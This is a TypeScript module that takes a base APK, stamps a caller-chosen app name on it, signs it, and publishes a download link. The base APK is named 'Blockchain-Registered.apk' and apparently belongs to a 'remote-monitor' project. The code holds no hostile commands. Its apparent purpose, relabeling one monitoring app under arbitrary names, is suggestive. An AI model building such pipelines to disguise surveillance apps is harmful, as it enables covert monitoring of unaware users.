import * as path from 'path';
import * as fs from 'fs';
import { customizeAPKWithZip } from './apk-customizer-zip';
import { signAPK } from './apk-signer';

interface APKBuilderOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
}

/**
 * Build customized APK with app name and package name
 * Uses ZIP manipulation to modify the base APK and signs it with valid certificate
 */
export async function buildCustomizedAPK(options: APKBuilderOptions): Promise<{
  success: boolean;
  apkPath?: string;
  downloadUrl?: string;
  filename?: string;
  error?: string;
}> {
  try {
    console.log(`[APK-BUILDER-CUSTOM] Starting customized APK build for: ${options.appName}`);
    console.log(`[APK-BUILDER-CUSTOM] URL: ${options.appUrl}`);

    // Find the base APK
    const possibleBasePaths = [
      '/app/public/apks/Blockchain-Registered.apk',
      '/home/ubuntu/remote-monitor/public/apks/Blockchain-Registered.apk',
      path.join(process.cwd(), 'public/apks/Blockchain-Registered.apk'),
    ];

    let baseAPK = '';
    for (const p of possibleBasePaths) {
      if (fs.existsSync(p)) {
        baseAPK = p;
        console.log(`[APK-BUILDER-CUSTOM] Found base APK at: ${baseAPK}`);
        break;
      }
    }

    if (!baseAPK) {
      console.error('[APK-BUILDER-CUSTOM] Base APK not found at any expected location');
      return {
        success: false,
        error: 'Base APK not found. Please ensure Blockchain-Registered.apk exists.',
      };
    }

    // Verify the base APK file is readable
    try {
      const stats = fs.statSync(baseAPK);
      console.log(`[APK-BUILDER-CUSTOM] Base APK size: ${(stats.size / 1024 / 1024).toFixed(2)}MB`);
    } catch (statError) {
      console.error('[APK-BUILDER-CUSTOM] Cannot read base APK:', statError);
      return {
        success: false,
        error: 'Base APK is not readable',
      };
    }

    // Generate output filename with timestamp and random suffix
    const timestamp = Date.now();
    const randomSuffix = Math.random().toString(36).substring(2, 8);
    const sanitizedName = options.appName
      .replace(/[^a-zA-Z0-9-]/g, '-')
      .replace(/-+/g, '-')
      .toLowerCase();
    const finalAPKName = `${sanitizedName}-${timestamp}-${randomSuffix}.apk`;
    console.log(`[APK-BUILDER-CUSTOM] Generated filename: ${finalAPKName}`);

    // Determine output directory
    const outputDir = path.join(process.cwd(), 'public', 'apks');
    console.log(`[APK-BUILDER-CUSTOM] Output directory: ${outputDir}`);

    // Ensure output directory exists
    if (!fs.existsSync(outputDir)) {
      try {
        fs.mkdirSync(outputDir, { recursive: true });
        console.log(`[APK-BUILDER-CUSTOM] Created output directory: ${outputDir}`);
      } catch (mkdirError) {
        console.error(`[APK-BUILDER-CUSTOM] Failed to create directory: ${outputDir}`, mkdirError);
        throw mkdirError;
      }
    }

    const finalAPKPath = path.join(outputDir, finalAPKName);
    console.log(`[APK-BUILDER-CUSTOM] Final APK path: ${finalAPKPath}`);

    // Customize the APK with new app name and package name
    console.log(`[APK-BUILDER-CUSTOM] Customizing APK with app name: ${options.appName}`);
    const customizeResult = await customizeAPKWithZip({
      baseApkPath: baseAPK,
      outputPath: finalAPKPath,
      appName: options.appName,
    });

    if (!customizeResult.success) {
      console.error('[APK-BUILDER-CUSTOM] Customization failed:', customizeResult.error);
      return {
        success: false,
        error: `APK customization failed: ${customizeResult.error}`,
      };
    }

    // Verify the customized APK file
    if (!fs.existsSync(finalAPKPath)) {
      throw new Error('Failed to create customized APK');
    }

    let customizedStats = fs.statSync(finalAPKPath);
    console.log(`[APK-BUILDER-CUSTOM] Customized APK size: ${(customizedStats.size / 1024 / 1024).toFixed(2)}MB`);

    // Sign the APK with valid certificate
    console.log(`[APK-BUILDER-CUSTOM] Signing APK with valid certificate...`);
    const signResult = await signAPK({
      apkPath: finalAPKPath,
    });

    if (!signResult.success) {
      console.warn(`[APK-BUILDER-CUSTOM] APK signing failed, continuing without signature:`, signResult.error);
      // Continue even if signing fails - the APK will still work, just without valid signature
    } else {
      console.log(`[APK-BUILDER-CUSTOM] ✓ APK signed successfully`);
    }

    const finalStats = fs.statSync(finalAPKPath);
    console.log(`[APK-BUILDER-CUSTOM] Final APK size: ${(finalStats.size / 1024 / 1024).toFixed(2)}MB`);

    // Build the download URL
    const domain = process.env.VITE_APP_URL || 'https://remotemon-vhmaxpe6.manus.space';
    const downloadUrl = `${domain}/apks/${finalAPKName}`;
    console.log(`[APK-BUILDER-CUSTOM] Download URL: ${downloadUrl}`);

    return {
      success: true,
      apkPath: finalAPKPath,
      downloadUrl: downloadUrl,
      filename: finalAPKName,
    };
  } catch (error) {
    console.error('[APK-BUILDER-CUSTOM] Error in customized APK build:', error);
    return {
      success: false,
      error: `APK build failed: ${error instanceof Error ? error.message : String(error)}`,
    };
  }
}
